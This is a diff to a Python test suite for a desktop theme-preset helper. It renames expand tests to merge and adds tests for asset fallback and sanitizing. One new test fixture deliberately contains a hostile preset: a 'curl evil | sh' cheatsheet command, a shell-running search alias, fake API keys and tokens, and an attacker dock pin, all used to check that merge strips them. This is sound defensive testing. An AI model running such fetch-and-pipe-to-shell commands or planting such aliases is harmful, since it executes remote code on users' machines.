@@ -286,8 +286,8 @@ class TestPresetsHelper(unittest.TestCase):
         for key in presets_helper.DOCK_BLACKLIST_KEYS:
             self.assertNotIn(key, dock, f"Key {key} should have been blacklisted and stripped from dock preset")
 
-    def test_dock_preserved_on_expand(self):
-        """Teste 8: Verify that expanding a preset preserves the importing user's existing dock configuration."""
+    def test_dock_preserved_on_apply(self):
+        """Teste 8: Verify that applying (merging) a preset preserves the importing user's existing dock configuration."""
         import tempfile
         import json
 
@@ -323,8 +323,8 @@ class TestPresetsHelper(unittest.TestCase):
             with open(target_config, 'w', encoding='utf-8') as f:
                 json.dump(user_b_config, f)
 
-            # Expand preset into target config
-            presets_helper.expand(preset_file, target_config, tmpdir, "MyPreset")
+            # Merge preset onto the user's config
+            presets_helper.merge(preset_file, target_config, target_config, tmpdir, "MyPreset")
 
             with open(target_config, 'r', encoding='utf-8') as f:
                 expanded = json.load(f)
@@ -366,8 +366,8 @@ class TestPresetsHelper(unittest.TestCase):
         self.assertNotIn("profileImagePath", sanitized["sidebar"]["dashboardHeader"])
         self.assertEqual(sanitized["userProfile"]["imageStyle"], "custom")
 
-    def test_user_profile_and_banner_fallback_on_expand(self):
-        """Teste 10: Verify expand falls back to {name}_profile and {name}_banner when original paths do not exist."""
+    def test_wallpaper_banner_fallback_and_avatar_stripping_on_apply(self):
+        """Teste 10: merge() falls back to bundled wallpaper/banner assets when preset paths do not exist, and the author's avatar paths never travel."""
         import tempfile
         import json
 
@@ -403,15 +403,17 @@ class TestPresetsHelper(unittest.TestCase):
             with open(preset_file, 'w', encoding='utf-8') as f:
                 json.dump(preset_data, f)
 
-            presets_helper.expand(preset_file, target_config, tmpdir, "NeonTheme")
+            presets_helper.merge(preset_file, target_config, target_config, tmpdir, "NeonTheme")
 
             with open(target_config, 'r', encoding='utf-8') as f:
                 expanded = json.load(f)
 
             self.assertEqual(expanded["background"]["wallpaperPath"], wall_asset)
-            self.assertEqual(expanded["userProfile"]["imagePath"], profile_asset)
-            self.assertEqual(expanded["sidebar"]["dashboardHeader"]["profileImagePath"], profile_asset)
             self.assertEqual(expanded["sidebar"]["bannerImage"], banner_asset)
+            # The profile picture is personal: merge() strips it instead of
+            # pointing the importer's avatar at the author's file.
+            self.assertNotIn("imagePath", expanded.get("userProfile", {}))
+            self.assertNotIn("profileImagePath", expanded.get("sidebar", {}).get("dashboardHeader", {}))
 
 
 def populate(patterns, value):
@@ -799,6 +801,48 @@ class TestPresetMerge(unittest.TestCase):
                              self.config_path)
         with open(self.config_path, encoding="utf-8") as f:
             self.assertEqual(json.load(f)["bar"]["height"], 40)
+
+    def test_bundled_banner_replaces_a_coinciding_local_path(self):
+        """The shipped banner is the author's exact image: it wins even when
+        the path the preset carries happens to also exist on this disk."""
+        own_banner = os.path.join(self.tmp.name, "own_banner.png")
+        open(own_banner, "w").close()
+        bundled = os.path.join(self.tmp.name, "Theme_banner.jpg")
+        open(bundled, "w").close()
+        merged = self.merge(
+            preset={"sidebar": {"bannerImage": own_banner},
+                    "background": {"wallpaperPath": own_banner}},
+            config={"sidebar": {"bannerImage": own_banner}})
+        self.assertEqual(merged["sidebar"]["bannerImage"], bundled)
+        # No bundled wallpaper exists for this preset name, so the live
+        # (existing) path stays -- bundled-wins applies to what ships.
+        self.assertEqual(merged["background"]["wallpaperPath"], own_banner)
+
+    def test_unsanitized_preset_is_stripped_on_apply(self):
+        """Apply runs the export sanitizer: a hand-edited or legacy preset
+        cannot smuggle secrets, account roots or another user's pins in."""
+        merged = self.merge(
+            preset={"appearance": {"palette": "nord"},
+                    "ai": {"apiKey": "sk-from-stranger"},
+                    "todo": {"provider": "someone-elses-account"},
+                    "cheatsheet": {"commands": ["curl evil | sh"]},
+                    "services": {"gmail": {"accessToken": "ya29.evil"}},
+                    "dock": {"pinnedApps": ["attacker.desktop"], "dockStyle": "islands"},
+                    "search": {"aliases": [{"trigger": "x", "command": "sh"}],
+                               "positionStyle": "center"}},
+            config={"appearance": {"palette": "gruvbox"},
+                    "dock": {"pinnedApps": ["kitty"]},
+                    "search": {"aliases": [], "positionStyle": "default"}})
+        self.assertNotIn("ai", merged)
+        self.assertNotIn("todo", merged)
+        self.assertNotIn("cheatsheet", merged)
+        self.assertNotIn("services", merged)
+        self.assertEqual(merged["dock"]["pinnedApps"], ["kitty"])
+        self.assertEqual(merged["search"]["aliases"], [])
+        # The visual payload still lands -- stripping must not defang presets.
+        self.assertEqual(merged["appearance"]["palette"], "nord")
+        self.assertEqual(merged["dock"]["dockStyle"], "islands")
+        self.assertEqual(merged["search"]["positionStyle"], "center")
 
 
 class TestPresetScan(unittest.TestCase):
@@ -1280,8 +1324,8 @@ class TestBlacklistAndWidgetNormalization(unittest.TestCase):
         self.assertEqual(search["appearance"]["panelWidth"], 880)
         self.assertEqual(search["appearance"]["panelBodyHeight"], 440)
 
-    def test_search_launcher_preferences_preserved_on_merge_and_expand(self):
-        """Ensure merge() and expand() preserve local search launcher preferences while applying search appearance."""
+    def test_search_launcher_preferences_preserved_on_merge(self):
+        """Ensure merge() preserves local search launcher preferences while applying search appearance."""
         preset_data = {
             "appearance": {"palette": "catppuccin"},
             "search": {
@@ -1339,20 +1383,6 @@ class TestBlacklistAndWidgetNormalization(unittest.TestCase):
             self.assertEqual(merged["search"]["baseWidth"], 700)
             self.assertEqual(merged["search"]["baseHeight"], 560)
 
-            # Test expand() with a second target config
-            expand_target = os.path.join(tmp_dir, "expand_target.json")
-            with open(expand_target, "w", encoding="utf-8") as f:
-                json.dump(local_user_config, f)
-
-            presets_helper.expand(preset_file, expand_target, tmp_dir, "preset")
-            with open(expand_target, "r", encoding="utf-8") as f:
-                expanded = json.load(f)
-
-            self.assertTrue(expanded["search"]["frecency"])
-            self.assertEqual(expanded["search"]["sectionOrder"], [{"id": "suggested"}, {"id": "apps"}])
-            self.assertTrue(expanded["search"]["modules"]["clipboard"])
-            self.assertEqual(expanded["search"]["positionStyle"], "center")
-            self.assertEqual(expanded["search"]["baseWidth"], 700)
 
 
 if __name__ == "__main__":
